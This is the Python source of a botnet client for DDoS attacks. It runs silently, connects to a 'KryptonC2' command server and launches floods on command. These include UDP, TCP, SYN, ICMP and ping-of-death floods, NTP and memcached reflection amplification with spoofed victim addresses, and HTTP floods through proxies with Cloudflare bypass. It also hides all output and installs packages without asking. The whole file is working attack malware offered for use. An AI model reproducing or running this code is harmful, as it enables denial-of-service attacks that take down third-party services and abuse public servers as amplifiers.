#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# language: Python, file: src/Payload/bot.py, target: Linux/Windows/macOS
# *Completely silent bot client with standard library fallbacks (no ModuleNotFoundError)*

import os, sys

# 1. SILENCE ALL OUTPUT COMPLETELY (NO TRACEBACKS, NO PRINTS)
try:
    _null_out = open(os.devnull, 'w')
    sys.stdout = _null_out
    sys.stderr = _null_out
except Exception:
    pass

import socket, threading, time, random, struct, ssl
from urllib.parse import urlparse
import urllib.request

# Dynamic safe imports & silent background installation
try:
    import cloudscraper
except Exception:
    try:
        import subprocess
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "cloudscraper", "requests", "pysocks", "--quiet", "--break-system-packages"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False
        )
        import cloudscraper
    except Exception:
        cloudscraper = None

try:
    import requests
except Exception:
    requests = None

try:
    import socks
except Exception:
    socks = None

try:
    from scapy.all import IP, UDP, Raw, ICMP, send
except Exception:
    IP = UDP = Raw = ICMP = send = None

try:
    from icmplib import ping as pig
except Exception:
    pig = None

# IP AND PORT C2 ------------------->
KRYPTONC2_ADDRESS  = "localhost"
KRYPTONC2_PORT     = 5511


# Code -------------------------->
base_user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def rand_ua():
    return random.choice(base_user_agents)

# Standard Library HTTP fallback (Zero dependencies required)
def std_http_request(url, headers=None, timeout=10):
    try:
        req = urllib.request.Request(url, headers=headers or {'User-Agent': rand_ua()})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, context=ctx, timeout=timeout) as resp:
            pass
    except Exception:
        pass

# AMP METHODS ----------------->
ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    if not send or not IP:
        return
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = [x.strip() for x in f if x.strip()]
    except Exception:
        ntp_servers = ["129.6.15.28", "132.163.96.1", "132.163.96.2"]

    if not ntp_servers:
        return

    server = random.choice(ntp_servers)
    while time.time() < timer:
        try:
            packet = (
                IP(dst=server, src=target)
                / UDP(sport=random.randint(1, 65535), dport=int(port))
                / Raw(load=ntp_payload)
            )
            for _ in range(500):
                send(packet, count=10, verbose=False)
        except Exception:
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    if not send or not IP:
        return
    try:
        with open("memsv.txt", "r") as f:
            memsv = [x.strip() for x in f if x.strip()]
    except Exception:
        memsv = []

    if not memsv:
        return

    server = random.choice(memsv)
    while time.time() < timer:
        try:
            packet = (
                IP(dst=server, src=target)
                / UDP(sport=port, dport=11211)
                / Raw(load=mem_payload)
            )
            for _ in range(500):
                send(packet, count=10, verbose=False)
        except Exception:
            pass

def icmp(target, timer):
    if pig:
        while time.time() < timer:
            try:
                packet = random._urandom(1024)
                pig(target, count=5, interval=0.1, payload_size=len(packet), payload=packet)
            except Exception:
                pass
    elif send and IP and ICMP:
        while time.time() < timer:
            try:
                pkt = IP(dst=target)/ICMP()/random._urandom(1024)
                send(pkt, verbose=False)
            except Exception:
                pass

def pod(target, timer):
    if not send or not IP or not ICMP:
        return
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet, verbose=False)
        except Exception:
            pass

# Old methods --------------------->
def spoofer():
    return f"{random.randrange(11, 197)}.{random.randrange(0, 255)}.{random.randrange(0, 255)}.{random.randrange(2, 254)}"

def httpSpoofAttack(url, timer):
    timeout = time.time() + int(timer)
    proxies = []
    try:
        with open("socks4.txt") as f:
            proxies = [x.strip() for x in f if x.strip()]
    except Exception:
        pass

    netloc = urlparse(url).netloc or url
    req = (
        f"GET / HTTP/1.1\r\nHost: {netloc}\r\n"
        f"User-Agent: {rand_ua()}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"X-Forwarded-For: {spoofer()}\r\n"
        f"Client-IP: {spoofer()}\r\n"
        "Connection: Keep-Alive\r\n\r\n"
    )

    while time.time() < timeout:
        try:
            if proxies and socks:
                proxy = random.choice(proxies).split(":")
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((str(netloc), 443))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=netloc)
            for _ in range(50):
                s.sendall(req.encode())
            s.close()
        except Exception:
            pass

# HTTP Attacks (Auto-fallback to standard library if 3rd party packages missing)
def run(target, proxies, cfbp):
    headers = {'User-Agent': rand_ua()}
    if cloudscraper:
        try:
            scraper = cloudscraper.create_scraper()
            p_dict = {'http': 'http://' + random.choice(proxies)} if proxies else None
            scraper.get(target, headers=headers, proxies=p_dict, timeout=10)
            return
        except Exception:
            pass
    if requests:
        try:
            p_dict = {'http': 'http://' + random.choice(proxies)} if proxies else None
            requests.get(target, headers=headers, proxies=p_dict, timeout=10)
            return
        except Exception:
            pass
    std_http_request(target, headers=headers)

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(0.5)

def httpio(target, times, threads, attack_type):
    from multiprocessing import Process
    proxies = []
    try:
        with open("http.txt") as f:
            proxies = [x.strip() for x in f if x.strip()]
    except Exception:
        pass

    processes = []
    for _ in range(min(threads, 64)):
        p = Process(target=thread, args=(target, proxies, 1))
        processes.append(p)
        p.start()
    time.sleep(times)
    for p in processes:
        try:
            os.kill(p.pid, 9)
        except Exception:
            pass

def CFB(url, port, secs):
    target = url if url.startswith("http") else f"http://{url}:{port}"
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        if cloudscraper:
            try:
                scraper = cloudscraper.create_scraper()
                for _ in range(50):
                    scraper.get(target, headers=headers, timeout=10)
            except Exception:
                pass
        else:
            for _ in range(20):
                std_http_request(target, headers=headers)

def STORM_attack(ip, port, secs):
    target = ip if ip.startswith("http") else f"http://{ip}:{port}"
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        if requests:
            try:
                s = requests.Session()
                for _ in range(50):
                    s.get(target, headers=headers, timeout=10)
            except Exception:
                pass
        else:
            for _ in range(20):
                std_http_request(target, headers=headers)

def GET_attack(ip, port, secs):
    target = ip if ip.startswith("http") else f"http://{ip}:{port}"
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        for _ in range(50):
            std_http_request(target, headers=headers)

# L4 Attacks
def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            s.sendto(data, (ip, dport))
            s.close()
        except Exception:
            pass

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
            s.close()
        except Exception:
            pass

def attack_SYN(ip, port, secs):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, 0b01000000, 0, 0, 0, 0)
            while time.time() < secs:
                s.send(pkt)
            s.close()
        except Exception:
            pass

def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        try:
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dport = random.randint(1, 65535) if port == 0 else port
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
            tcp.close()
            udp.close()
        except Exception:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(10):
                s.sendto(payload, (ip, port))
            s.close()
        except Exception:
            pass

def attack_vse(ip, port, secs):
    payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.close()
        except Exception:
            pass

def attack_roblox(ip, port, secs, size):
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = random._urandom(size)
            dport = random.randint(1, 65535) if port == 0 else port
            for _ in range(50):
                s.sendto(data, (ip, dport))
            s.close()
        except Exception:
            pass

def attack_junk(ip, port, secs):
    payload = b'\x00' * 128
    while time.time() < secs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.close()
        except Exception:
            pass

# Main Bot Loop
def main():
    while 1:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.settimeout(15)
            c2.connect((KRYPTONC2_ADDRESS, int(KRYPTONC2_PORT)))
            
            # Solve captcha bypass
            c2.sendall(b'669787761736865726500\r\n')
            
            # Auth as BOT
            while 1:
                data = c2.recv(1024).decode('utf-8', errors='ignore')
                if 'Username' in data:
                    c2.sendall(b'BOT\r\n')
                    break
            
            while 1:
                data = c2.recv(1024).decode('utf-8', errors='ignore')
                if 'Password' in data:
                    c2.sendall('\xff\xff\xff\xff\75'.encode('cp1252'))
                    break
            
            # Command processing loop
            c2.settimeout(None)
            while 1:
                data = c2.recv(1024).decode('utf-8', errors='ignore').strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(min(threads, 100)):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(min(threads, 100)):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.NTP':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()

                elif command == '.MEM':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()

                elif command == '.ICMP':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()

                elif command == '.POD':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=pod, args=(ip, timer), daemon=True).start()

                elif command == '.TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(min(threads, 100)):
                        threading.Thread(target=attack_tup, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()

                elif command == '.ROBLOX' or command == '.UDMUX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(min(threads, 100)):
                        threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()

                elif command == '.JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])
                    for _ in range(min(threads, 100)):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()

                elif command == '.SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()

                elif command == ".HTTPSTORM":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=STORM_attack, args=(url, port, secs), daemon=True).start()

                elif command == ".HTTPGET":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=GET_attack, args=(url, port, secs), daemon=True).start()

                elif command == ".HTTPCFB":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=CFB, args=(url, port, secs), daemon=True).start()

                elif command == ".HTTPIO":
                    url = args[1]
                    secs = int(args[2])
                    threads = int(args[3])
                    attackType = args[4]
                    threading.Thread(target=httpio, args=(url, secs, threads, attackType), daemon=True).start()

                elif command == ".HTTPSPOOF":
                    url = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    for _ in range(min(threads, 50)):
                        threading.Thread(target=httpSpoofAttack, args=(url, timer), daemon=True).start()

                elif command == 'PING':
                    c2.sendall(b'PONG\r\n')

            c2.close()
        except Exception:
            time.sleep(5)

if __name__ == '__main__':
    try:
        main()
    except Exception:
        pass
